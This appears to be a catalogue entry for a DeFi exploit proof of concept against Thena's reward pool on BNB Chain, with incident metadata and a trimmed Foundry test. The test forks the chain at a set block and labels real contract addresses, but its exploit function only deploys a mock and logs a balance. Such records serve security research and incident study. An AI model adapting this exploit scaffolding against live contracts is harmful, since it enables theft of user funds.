# [?] - Thena - Yield Protocol Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Thena
Published: 2023-03-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Thena_exp.sol
Type: defi-exploit-poc

## Details
Lost: $10k
References:
- https://twitter.com/LTV888/status/1640563457094451214?t=OBHfonYm9yYKvMros6Uw_g&s=19
- https://bscscan.com/tx/0xdf6252854362c3e96fd086d9c3a5397c303d265649aee0b023176bb49cf00d4b

```solidity
contract ContractTest is Test {
    IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 wUSDR = IERC20(0x2952beb1326acCbB5243725bd4Da2fC937BCa087);
    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Router_V2 Router = Uni_Router_V2(0x20a304a7d126758dfe6B243D0fc515F83bCA8431);
    Uni_Pair_V2 USDC_BUSD = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
    IVolatileV1 wUSDR_USDC = IVolatileV1(0xA99c4051069B774102d6D215c6A9ba69BD616E6a);

    MockThenaRewardPool mock;

    function setUp() public {
        cheats.createSelectFork("bsc", 26_834_149);
        cheats.label(address(THENA), "THENA");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(pool), "ThenaRewardPool");
        cheats.label(address(Router), "UniV2Router");
        cheats.label(address(USDC_BUSD), "USDC_BUSD");
        cheats.label(address(wUSDR), "wUSDR");
        cheats.label(address(wUSDR_USDC), "wUSDR_USDC");
    }

    function testExploit() external {
        mock = new MockThenaRewardPool();
        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Thena_exp.sol_
